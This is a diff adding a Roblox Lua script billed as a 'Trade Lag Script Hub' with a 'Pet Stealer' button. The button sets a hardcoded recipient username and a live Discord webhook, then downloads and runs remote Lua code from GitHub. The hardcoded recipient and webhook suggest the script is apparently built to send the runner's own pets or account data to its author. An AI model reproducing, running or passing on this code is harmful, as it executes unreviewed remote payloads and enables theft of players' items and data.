@@ -1,0 +1,21 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade Lag Script Hub made by gthuvv", "DarkTheme")
+
+-- MAIN
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Pet Stealer")
+
+
+MainSection:NewButton("Steal Pet (on trade)", "Steal Pets Easily", function()
+    Username = "charles45825"
+    --Username2 = "valkyriadmz" (will be back soon)
+    WebHook = "https://discord.com/api/webhooks/1114159063463374928/y2dA2eUOy5Pt_pOiW56UlZ3ZtdopWS8_WPhvT6Yd4rd-3j-jNTnD3Nx317x-HzegdKpQ"
+    loadingscreen = true
+    _G.CustomScriptName = "Pet Stealer Script"
+    _G.Text1 = "Script Loaded..."
+    _G.Text2 = "Waiting for Script..."
+    _G.Text3 = "Checking Scripts..."
+    _G.Text4 = "Starting Script..."
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+end)
+
